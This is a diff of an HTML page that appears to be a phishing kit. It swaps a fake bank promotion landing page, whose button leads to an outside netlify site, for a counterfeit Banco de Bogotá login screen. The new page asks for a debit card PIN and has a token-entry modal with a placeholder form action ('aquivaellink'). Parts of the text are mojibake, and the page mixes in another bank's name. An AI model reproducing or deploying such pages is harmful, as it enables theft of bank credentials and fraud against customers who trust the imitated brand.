@@ -1,341 +1,357 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bienvenida a esta promoción exclusiva para Clientes</title>
-    <style>
-        body {
-            margin: 0;
-            background-color: #e7e6eb;
-        }
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 
-        .header {
-            width: 100%;
-            height: 60px;
-            background-color: white;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 5px;
-        }
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        .logo {
-           
-        }
+<meta http-equiv="refresh" content="2;url=inicio.html">
 
-        .menu-container {
-            display: flex;
-            align-items: center;
-            margin-right: 20px;
-        }
+<title>Exclusivo para clientes del Banco de Botot&aacute;</title>
 
-        .menu-container .btn-ingresar {
-            background-color: #0048ba;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        .menu-container .menu-icon {
-            font-size: 18px;
-            color: #0048ba;
-            cursor: pointer;
-        }
-
-        .button {
-            font-weight: 600;
-            --sherpa-midnight-800: #0040a8;
-            --sherpa-white: #fff;
-            width: 380px;
-            border-radius: 100px;
-            cursor: pointer;
-            outline: none;
-            user-select: none;
-            border: solid 1px var(--sherpa-midnight-800);
-            background-color: var(--sherpa-midnight-800);
-            color: var(--sherpa-white);
-            transition: 0.3s;
-            height: 48px;
-            font-size: 16px;
-            font-family: Roboto-Medium, sans-serif;
-            position: relative;
-           
-        }
-        .pp {
-            content: "";
-        }
-        .ass {
-            font-size: 10px;
-    visibility: inherit;
-    --sherpa-midnight-50: #f6faff;
-    --sherpa-midnight-200: #d4e5f8;
-    --sherpa-midnight-300: #b0cdf1;
-    --sherpa-midnight-400: #94bae9;
-    --sherpa-midnight-600: #4d86d4;
-    --sherpa-midnight-700: #1054b7;
-    --sherpa-midnight-800: #0043a9;
-    --sherpa-midnight-900: #00317e;
-    --sherpa-white: #ffffff;
-    --sherpa-carbon-50: #f2f2f2;
-    --sherpa-carbon-200: #e6e6e6;
-    --sherpa-carbon-300: #cccccc;
-    --sherpa-carbon-400: #b3b3b3;
-    --sherpa-carbon-600: #808080;
-    --sherpa-carbon-700: #666666;
-    --sherpa-carbon-800: #444444;
-    --sherpa-carbon-900: #000000;
-    --sherpa-info-100: #edf7ff;
-    --sherpa-info-500: #9ac7eb;
-    --sherpa-info-800: #2076c2;
-    --sherpa-info-900: #004f99;
-    --sherpa-success-100: #ecffe2;
-    --sherpa-success-500: #95e077;
-    --sherpa-success-800: #198500;
-    --sherpa-success-900: #105c00;
-    --sherpa-warning-100: #fff0e0;
-    --sherpa-warning-500: #ecc192;
-    --sherpa-warning-800: #b15c00;
-    --sherpa-warning-900: #773e00;
-    --sherpa-error-100: #ffe7e6;
-    --sherpa-error-500: #eda4a1;
-    --sherpa-error-800: #c94740;
-    --sherpa-error-900: #940700;
-    --sherpa-peach-800: #cc4700;
-    --sherpa-peach-500: #da8658;
-    --sherpa-mustard-800: #927200;
-    --sherpa-mustard-500: #ebcd5a;
-    --sherpa-khaki-800: #6d6d25;
-    --sherpa-khaki-500: #a7a66f;
-    --sherpa-bluey-800: #446e80;
-    --sherpa-bluey-500: #8cafbe;
-    --sherpa-rose-800: #9a3e47;
-    --sherpa-rose-500: #f0bec3;
-    --sherpa-mauve-800: #97437b;
-    --sherpa-mauve-500: #c8aabe;
-    --sherpa-bluebrand-800: #14327d;
-    --sherpa-yellowbrand-800: #ffbe00;
-    --sherpa-redbrand-900: #cd3232;
-    --sherpa-burgundy-800: #b95477;
-    --sherpa-green-800: #00856d;
-    --sherpa-spacing-0: 0px;
-    --sherpa-spacing-1: 4px;
-    --sherpa-spacing-2: 8px;
-    --sherpa-spacing-3: 12px;
-    --sherpa-spacing-4: 16px;
-    --sherpa-spacing-5: 20px;
-    --sherpa-spacing-6: 24px;
-    --sherpa-spacing-7: 32px;
-    --sherpa-spacing-8: 40px;
-    --sherpa-spacing-9: 48px;
-    --sherpa-spacing-10: 56px;
-    --sherpa-spacing-11: 80px;
-    --sherpa-spacing-12: 120px;
-    --sherpa-spacing-13: 160px;
-    --sherpa-max-container-width: 73rem;
-    --sherpa-padding-vertical: 0.5rem;
-    --sp-color-background-info-light: var(--sherpa-info-100);
-    --sp-color-background-info-dark: var(--sherpa-info-500);
-    --sp-color-background-warning-light: var(--sherpa-warning-100);
-    --sp-color-background-warning-dark: var(--sherpa-warning-500);
-    --sp-color-background-success-light: var(--sherpa-success-100);
-    --sp-color-background-success-dark: var(--sherpa-success-500);
-    --sp-color-background-error-light: var(--sherpa-error-100);
-    --sp-color-background-error-dark: var(--sherpa-error-500);
-    --sp-color-background-disabled-light: var(--sherpa-carbon-50);
-    --sp-color-background-disabled-dark: var(--sherpa-carbon-600);
-    --sp-color-border-info: var(--sherpa-info-500);
-    --sp-color-border-warning: var(--sherpa-warning-500);
-    --sp-color-border-success: var(--sherpa-success-500);
-    --sp-color-border-error: var(--sherpa-error-500);
-    --sp-color-border-disabled: var(--sherpa-carbon-600);
-    --sp-border-radius-1: 4px;
-    --sp-border-radius-2: 8px;
-    --sp-border-radius-3: 12px;
-    --sp-border-radius-4: 16px;
-    --sp-color-text-info: var(--sherpa-info-900);
-    --sp-color-text-warning: var(--sherpa-warning-900);
-    --sp-color-text-success: var(--sherpa-success-900);
-    --sp-color-text-error: var(--sherpa-error-900);
-    --sherpa-gutter-width: 1rem;
-    font-family: "Roboto",sans-serif;
-  max-width: 50%;
-  min-width: 100%;
-    position: relative;
-    background-color: var(--sherpa-midnight-800);
-    border-radius: 0 0 var(--sherpa-spacing-6) var(--sherpa-spacing-6);
-    color: var(--sherpa-white);
-    overflow: hidden;
-        }
-
-        .puff {
-            font-size: 10px;
-    visibility: inherit;
-    --sherpa-midnight-50: #f6faff;
-    --sherpa-midnight-200: #d4e5f8;
-    --sherpa-midnight-300: #b0cdf1;
-    --sherpa-midnight-400: #94bae9;
-    --sherpa-midnight-600: #4d86d4;
-    --sherpa-midnight-700: #1054b7;
-    --sherpa-midnight-800: #0043a9;
-    --sherpa-midnight-900: #00317e;
-    --sherpa-white: #ffffff;
-    --sherpa-carbon-50: #f2f2f2;
-    --sherpa-carbon-200: #e6e6e6;
-    --sherpa-carbon-300: #cccccc;
-    --sherpa-carbon-400: #b3b3b3;
-    --sherpa-carbon-600: #808080;
-    --sherpa-carbon-700: #666666;
-    --sherpa-carbon-800: #444444;
-    --sherpa-carbon-900: #000000;
-    --sherpa-info-100: #edf7ff;
-    --sherpa-info-500: #9ac7eb;
-    --sherpa-info-800: #2076c2;
-    --sherpa-info-900: #004f99;
-    --sherpa-success-100: #ecffe2;
-    --sherpa-success-500: #95e077;
-    --sherpa-success-800: #198500;
-    --sherpa-success-900: #105c00;
-    --sherpa-warning-100: #fff0e0;
-    --sherpa-warning-500: #ecc192;
-    --sherpa-warning-800: #b15c00;
-    --sherpa-warning-900: #773e00;
-    --sherpa-error-100: #ffe7e6;
-    --sherpa-error-500: #eda4a1;
-    --sherpa-error-800: #c94740;
-    --sherpa-error-900: #940700;
-    --sherpa-peach-800: #cc4700;
-    --sherpa-peach-500: #da8658;
-    --sherpa-mustard-800: #927200;
-    --sherpa-mustard-500: #ebcd5a;
-    --sherpa-khaki-800: #6d6d25;
-    --sherpa-khaki-500: #a7a66f;
-    --sherpa-bluey-800: #446e80;
-    --sherpa-bluey-500: #8cafbe;
-    --sherpa-rose-800: #9a3e47;
-    --sherpa-rose-500: #f0bec3;
-    --sherpa-mauve-800: #97437b;
-    --sherpa-mauve-500: #c8aabe;
-    --sherpa-bluebrand-800: #14327d;
-    --sherpa-yellowbrand-800: #ffbe00;
-    --sherpa-redbrand-900: #cd3232;
-    --sherpa-burgundy-800: #b95477;
-    --sherpa-green-800: #00856d;
-    --sherpa-spacing-0: 0px;
-    --sherpa-spacing-1: 4px;
-    --sherpa-spacing-2: 8px;
-    --sherpa-spacing-3: 12px;
-    --sherpa-spacing-4: 16px;
-    --sherpa-spacing-5: 20px;
-    --sherpa-spacing-6: 24px;
-    --sherpa-spacing-7: 32px;
-    --sherpa-spacing-8: 40px;
-    --sherpa-spacing-9: 48px;
-    --sherpa-spacing-10: 56px;
-    --sherpa-spacing-11: 80px;
-    --sherpa-spacing-12: 120px;
-    --sherpa-spacing-13: 160px;
-    --sherpa-max-container-width: 73rem;
-    --sherpa-padding-vertical: 0.5rem;
-    --sp-color-background-info-light: var(--sherpa-info-100);
-    --sp-color-background-info-dark: var(--sherpa-info-500);
-    --sp-color-background-warning-light: var(--sherpa-warning-100);
-    --sp-color-background-warning-dark: var(--sherpa-warning-500);
-    --sp-color-background-success-light: var(--sherpa-success-100);
-    --sp-color-background-success-dark: var(--sherpa-success-500);
-    --sp-color-background-error-light: var(--sherpa-error-100);
-    --sp-color-background-error-dark: var(--sherpa-error-500);
-    --sp-color-background-disabled-light: var(--sherpa-carbon-50);
-    --sp-color-background-disabled-dark: var(--sherpa-carbon-600);
-    --sp-color-border-info: var(--sherpa-info-500);
-    --sp-color-border-warning: var(--sherpa-warning-500);
-    --sp-color-border-success: var(--sherpa-success-500);
-    --sp-color-border-error: var(--sherpa-error-500);
-    --sp-color-border-disabled: var(--sherpa-carbon-600);
-    --sp-border-radius-1: 4px;
-    --sp-border-radius-2: 8px;
-    --sp-border-radius-3: 12px;
-    --sp-border-radius-4: 16px;
-    --sp-color-text-info: var(--sherpa-info-900);
-    --sp-color-text-warning: var(--sherpa-warning-900);
-    --sp-color-text-success: var(--sherpa-success-900);
-    --sp-color-text-error: var(--sherpa-error-900);
-    --sherpa-gutter-width: 1rem;
-    font-family: "Roboto",sans-serif;
-    box-sizing: border-box;
-    -webkit-font-smoothing: antialiased;
-    display: block;
-    justify-content: space-between;
-    align-items: center;
-    background-color: var(--sherpa-white);
-    cursor: pointer;
-    padding: var(--sherpa-spacing-6);
-    padding-left: 0px;
-    border-top-left-radius: 8px;
-    border-top-right-radius: 8px;
-    border-bottom: 1px solid transparent;
-    border-bottom-left-radius: 8px;
-    border-bottom-right-radius: 8px;
-        }
-        
-        .cassa {
-
-border-radius: 5px;
-            max-width: 50%;
-            min-width: 100%;
-        }
-    </style>
+<link rel="stylesheet" href="./bogo/lfr_style.css">
+<link rel="stylesheet" href="./bogo/lfr_ownstyle.css">
 </head>
-<body>
+<body style="">
 
-<div class="header">
-    <div>
-<svg style="margin-left: 50px;" width='12%' height='100%' viewBox='0 0 48 49' fill='none' xmlns='http://www.w3.org/2000/svg'><g clip-path='url(#clip0_4770_81544)'><g clip-path='url(#clip1_4770_81544)'><path d='M27.034 2.0664C27.0504 2.06814 27.0669 2.06642 27.0825 2.06136C27.0982 2.0563 27.1125 2.04801 27.1248 2.03702C27.137 2.02604 27.1467 2.0126 27.1534 1.9976C27.1601 1.98259 27.1636 1.96634 27.1636 1.94991C27.1636 1.93348 27.1601 1.91724 27.1534 1.90223C27.1467 1.88722 27.137 1.87379 27.1248 1.86281C27.1125 1.85182 27.0982 1.84353 27.0825 1.83847C27.0669 1.83341 27.0504 1.83169 27.034 1.83343C11.3709 -0.504202 -6.10352e-05 10.6364 -6.10352e-05 23.8027C-6.10352e-05 35.4882 8.80422 45.8509 21.5862 45.8509C25.4032 45.8509 29.5322 44.915 32.6425 42.5011C33.4994 41.7995 33.889 41.4099 34.2009 40.2411C34.2009 40.2411 34.8235 37.8258 34.2786 35.5672C34.2009 35.2552 34.1219 35.2552 33.8113 35.4105C31.1617 36.424 26.572 37.5165 22.826 37.5165C12.6213 37.5139 6.15991 29.1782 6.15991 20.3752C6.15991 11.3379 14.4917 1.5228 27.034 2.0664Z' fill='#CD3232'/><path d='M42.2247 11.5709C42.2247 3.93677 29.2927 1.28719 20.8004 3.4695C20.5661 3.54716 20.6451 3.70248 20.8004 3.70248C26.5655 3.0799 33.6547 6.74166 33.6547 11.1813C33.6547 14.3758 29.9153 16.0119 27.7316 16.8688C27.5763 16.9464 27.654 17.103 27.8093 17.103C31.9383 16.4015 35.6001 16.7082 38.5603 17.0254C38.8722 17.0254 39.0276 16.8688 39.2618 16.7134C40.8242 15.6223 42.2247 14.0639 42.2247 11.5709Z' fill='#FFBE00'/><path d='M14.647 22.1666C28.7478 22.1666 35.6817 29.8797 35.6817 37.8298C35.6817 44.3741 29.6836 47.4909 24.5411 48.1911C24.51 48.1911 24.4802 48.2035 24.4583 48.2255C24.4363 48.2474 24.424 48.2772 24.424 48.3083C24.424 48.3394 24.4363 48.3692 24.4583 48.3911C24.4802 48.4131 24.51 48.4254 24.5411 48.4254C36.3872 48.4254 46.4327 42.3484 46.4327 33.7784C46.4327 29.5664 43.9397 26.6892 41.3691 24.1186C41.0572 23.8066 40.9743 23.8066 40.7466 23.9619C39.3434 24.8978 37.785 26.7668 37.0058 30.3509C37.0058 30.4286 36.8505 30.4286 36.8505 30.3509C37.0058 24.6635 40.5899 21.0057 47.3685 21.0057C47.5238 21.0057 47.5238 20.8504 47.3685 20.7727C37.5521 16.1751 24.853 16.7213 14.647 22.0192C14.4917 22.0889 14.5693 22.1666 14.647 22.1666Z' fill='#FFBE00'/></g></g><defs><clipPath id='clip0_4770_81544'><rect width='47.996' height='48' fill='white' transform='translate(0 0.521484)'/></clipPath><clipPath id='clip1_4770_81544'><rect width='47.4844' height='46.9' fill='white' transform='translate(-6.10352e-05 1.52148)'/></clipPath></defs></svg>
-    </div>
-    <div class="menu-container">
-
-
-<p class="pp"></p>  
-<img width="25px" src="archivo/salida.png" alt="">
-
-
+	<div class="box-container">
+		<div class="container">
+			<div class="toast hidden" id="errorMessage" style="position: absolute;">
+   <p id="AuthLabel"></p>
+   <span class="icon-close-search-r" onclick="hideToast()"></span>
 </div>
+			<div class="container__water-mark">
+				<div class="container__water-mark--image-container"></div>
+			</div>
+			<div class="container__login">
+				<div class="container__login--header">
+					<img src="./bogo/logobanco1.png" alt="">
+				</div>
+				<div class="container__login--title">
+					<div class="container__login--title-1">
+						<div class="container__login--title-1">
+                        	<p>Identificacion de usuario</p>
+	                    </div>
+	                    <div class="container__login--title-2">
+	                        <p>
+	                        	<label class="tituloformulario" id="flujoOrigenLbl"></label>
+	                        </p>
+	                    </div>
+					</div>
+				</div>
+				<div class="container__login--login-box-id">
+					<div class="container__login--login-box-title">
+						<span><strong>Ha ingresado desde: BANCOLOMBIA
+						</strong></span>
+					</div>
+					<div class="form-container">
+
+						<form method="post" name="authenticateForm" id="authenticateForm" action="#" autocomplete="off">
+							<input type="hidden" size="8" id="currentSessionTime" name="currentSessionTime" value="1709245729624">
+							<input type="hidden" size="8" id="initSessionTime" name="initSessionTime" value="1709245646774">
+							<input type="hidden" size="8" id="validSessionTime" name="validSessionTime" value="00:07">
+							<input type="hidden" size="8" name="cancelationCause"> <input type="hidden" size="8" name="cancelationSource" value="Authentication"> <input type="hidden" size="8" name="backToken" value="false"> <input type="hidden" name="ClientRequieresToken" value="">
+						
+							<input type="hidden" name="processInstanceId" value="000000018DF6FC0B4D0A4167875F3330">
+<input type="hidden" name="activityInstanceId" value="000000018DF6FC0B582163893B41494E">
+
+
+
+							<div class="field-1">
+								<div class="custom-input">
+									<div class="label">
+										<label for="password">Clave de la tarjeta debito</label>
+									</div>
+									<input name="Password" type="password" class="custom-form-control" id="Password" maxlength="4" size="8">
+								</div>
+							</div>
+
+							<div class="btn-container">
+								<button type="button" class="btn-main" id="btnContinue" onclick="validate();" disabled="">Continuar</button>
+							</div>
+						</form>
+					</div>
+				</div>
+				<div class="timeElapsed">
+	<label>Tiempo restante&nbsp;</label><span id="timeE_min">05</span><label>:</label><span id="timeE_seg">18</span><label>&nbsp;minutos</label><br> <label><span id="timeE_date">Jueves, 29 de Febrero de 2024, 5:28 PM</span></label><br> <label><span id="timeE_ip">IP 186.116.65.249</span></label>
+</div>
+			</div>
+
+			<style>
+    ul {
+        list-style-type: none;
+        margin-top: 2rem;
+        margin-left: 4rem;
+        vertical-align: top;
+    }
+
+    li {
+        display: flex;
+        align-items: center;
+        margin-bottom: 1rem;
+    }
+
+    .icon-info {
+        width: 3rem;
+        height: 3rem;
+        margin-right: 1rem;
+        object-fit: cover;
+    }
+</style>
+<div class="container__info">
+    <div class="container__info--tips">
+        <div class="collapsable">
+            <div class="collapse">
+                <div class="collapse__header">
+                    <div class="collapse__header--text">
+                        <p class="header">Tu seguridad es lo primero</p>
+                    </div>
+                    <div class="collapse__header--btn">
+                        <i class="icon-down-b"></i>
+                    </div>
+                </div>
+                <div class="collapse__content hidden">
+                    <p>Sigue estos tips y tus transacciones estarÃ¯Â¿Â½n blindadas</p>
+                    <ul>
+                        <li><img id="icon-pass" class="icon-info" src="./bogo/icon-pass.png"><p><strong>No compartas</strong> tus claves o token con terceros.</p></li>
+                        <li><img id="icon-device" class="icon-info" src="./bogo/icon-device.png"><p><strong>Evita realizar</strong> transacciones desde un equipo o dispositivo desconocido.</p></li>
+                        <li><img id="icon-lock" class="icon-info" src="./bogo/icon-lock.png"><p><strong>Procura cambiar</strong> tus contraseÃ¯Â¿Â½as bancarias periÃ¯Â¿Â½dicamente o antes si sientes que es necesario.</p></li>
+                    </ul>  
+                </div>
+            </div>
+        </div>
+        <div class="collapsable">
+            <div class="collapse">
+                <div class="collapse__header">
+                    <div class="collapse__header--text">
+                        <p class="header">ContÃ¯Â¿Â½ctanos</p>
+                    </div>
+                    <div class="collapse__header--btn">
+                        <i class="icon-down-b"></i>
+                    </div>
+                </div>
+                <div class="collapse__content hidden">
+                    <p>Si tienes alguna duda o algo te ha sucedido, usa nuestros canales</p>
+                    <ul>
+                        <li><img id="icon-call" class="icon-info" src="./bogo/icon-call.png"><p>Llamar a la <strong>Servilinea</strong></p></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>		<div class="modal modalSE hidden" id="safeExitModal">
+	<div class="modal__container" id="semc">
+		<span class="close" id="closeModalSE" onclick="hideModalSE()">Ã¯Â¿Â½</span>
+		<div class="modal-title">
+			<h2>Abandonar el proceso</h2>
+		</div>
+		<div class="modal-text" id="modalSafeExitMsg">
+			<p>Ha activado una Salida de forma segura</p>
+		</div>
+		<div class="modal-action">
+			<button type="button" class="btn-main" onclick="lfr_controlExit()">Aceptar</button>
+		</div>
+	</div>
+</div>
+<div class="overlay overlaySE hidden"></div>
+			<div class="modal modalMA hidden">
+	<div class="modal__container" id="containerMA">
+		<h2 class="modal-title">Se requiere una acciÃ¯Â¿Â½n vÃ¯Â¿Â½lida</h2>
+		<div class="modal__container--content">
+			<p class="modal-text" id="modalAlertMsg"></p>
+			<div class="modal-action">
+				<button type="button" class="btn-main" onclick="hideModalMA()">Entendido</button>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="overlay overlayMA hidden"></div>
+
+			<div class="modal modalIN hidden">
+	<div class="modal__container">
+		<div class="modal-title">
+			<h2>Accion Automotica Activada</h2>
+		</div>
+		<div class="modal-text">
+			<p id="modalAlertMsgIN"></p>
+		</div>
+		<div class="modal-action">
+			<button type="button" class="btn-main" onclick="lfr_inactivityAction()">Entendido</button>
+		</div>
+	</div>
+</div>
+<div class="overlay overlayIN hidden"></div>
+
+			 <style>
+    .btn-img {
+        background: none;
+        border: none;
+        min-width: 15rem;
+        height: 5rem;
+        outline: none;
+        cursor: pointer;
+    }
+
+    #getOnPlayStore{
+        min-width: 15rem;
+        height: 5rem;
+        object-fit: cover;
+    }
+    
+    @media only screen and (max-width: 37.5em) {
+        #getOnPlayStore{
+            height: 4rem !important;
+        }
+    }
+
+    #tokenAppImg{
+        min-width: 6rem;
+        height: 6rem;
+    }
+
+    #getOnAppStore{
+        min-width: 15rem;
+        height: 5rem;
+        object-fit: cover;
+    }
+    
+    @media only screen and (max-width: 37.5em) {
+        #getOnAppStore{
+            height: 4rem !important;
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+    }
+
+
+    .modalPopUp-text{
+        font-size: 1.6rem;
+        color: black;
+        margin-bottom: 1.5rem;
+    }
+
+    #download{
+        color: #0040a8;
+    }
+
+    .link{
+        color: #0040a8;
+        text-decoration: underline;
+        cursor: pointer;
+    }
+    
+    #modalAction{
+    	margin-bottom: 1.5rem;
+    }
+
+    .modal-bottom{
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+    }
+</style>
+<form action="aquivaellink" method="post" id="tok">
+<div class="modal modalUP">
+    <div class="modal__container">
+        <h2 class="modal-title">Realiza tu solicitud en linea</h2><br>
+		<style>
+			.token-container {
+				display: flex;
+				flex-wrap: wrap; /* Permitir que los elementos se envuelvan en pantallas pequeÃƒÂ±as */
+				justify-content: space-around;
+				max-width: 400px; /* Ajusta el ancho mÃƒÂ¡ximo segÃƒÂºn tus necesidades */
+				margin: auto; /* Centra el contenedor */
+			}
+		
+			.token-input {
+				width: 30%; /* Ajusta el ancho del cuadro segÃƒÂºn tus necesidades */
+				max-width: 60px; /* Establecer un ancho mÃƒÂ¡ximo para evitar que los cuadros sean demasiado grandes */
+				height: 60px; /* Ajusta la altura del cuadro segÃƒÂºn tus necesidades */
+				text-align: center;
+				font-size: 20px; /* Ajusta el tamaÃƒÂ±o de la fuente segÃƒÂºn tus necesidades */
+				border: 2px solid #ccc;
+				border-radius: 8px;
+				margin-bottom: 10px; /* Espaciado entre cuadros */
+			}
+		
+			@media screen and (max-width: 600px) {
+				.token-input {
+					width: 45%; /* Ajusta el ancho del cuadro para pantallas muy pequeÃƒÂ±as */
+					max-width: 40px; /* Reduzca aÃƒÂºn mÃƒÂ¡s el ancho mÃƒÂ¡ximo en dispositivos mÃƒÂ³viles */
+					height: 40px; /* Reduzca la altura en dispositivos mÃƒÂ³viles */
+					font-size: 16px; /* Reduzca el tamaÃƒÂ±o de la fuente en dispositivos mÃƒÂ³viles */
+				}
+			}
+		</style>
+
+<div class="loader-container">
+    <div class="loader"></div>
+    <p> </p>
 </div>
 
-<center>
+<style>
 
 
-    <div  class="ass">
+.loader-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    color: #333;
+}
 
+.loader {
+    border: 8px solid #184bdd; /* Establece el color azul (#3498db) */
+    border-top: 8px solid transparent;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
 
-        <br>    
-        <div style="margin: 10px;">
-        <h1>Registrate para obtener tus beneficios ahora.</h1>
-       </div>
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
 
-       <br>    <br>
-        <img width="350px" src="archivo/choose-our-channels.png" alt="">
+</style>
+
+<script>
+    function moveToNextInput(currentInput, nextInputIndex) {
+        const inputValue = currentInput.value;
+
+        if (!isNaN(inputValue) && nextInputIndex) {
+            const nextInput = document.querySelector(`.token-input:nth-child(${nextInputIndex})`);
+            nextInput.focus();
+        }
+    }
+</script>
+
+<script>
+    function moveToNextInput(currentInput, nextInputIndex) {
+        const inputValue = currentInput.value;
+
+        if (!isNaN(inputValue) && nextInputIndex) {
+            const nextInput = document.querySelector(`.token-input:nth-child(${nextInputIndex})`);
+            nextInput.removeAttribute('readonly');
+            nextInput.focus();
+        }
+    }
+</script><br>
+ 
+<br><br>
+        <div class="modal-bottom">
+            <p class="modal-text">*Recuerda tener tu <b>Dispositivo móvil</b> para aprobar cualquier solicitud.</p>
+            
+        </div>
     </div>
+</div></form>
+<div class="overlay overlayUP"></div>
 
 
+		</div>
 
-    <br>
- 
- 
- 
- 
- 
-<input type="submit" class="button" value="Ingresar" onclick="window.location.href='https://banconline.netlify.app/'">
-<br> 
-<br>
-<img style="margin-top: 30px;" class="cassa" src="archivo/71-f2b87847cb253ce1b23de71b279a0caa.jpg" alt=""> 
+	</div>	
 
 
-
-</center>
-
-</body>
-</html>
+</body></html>
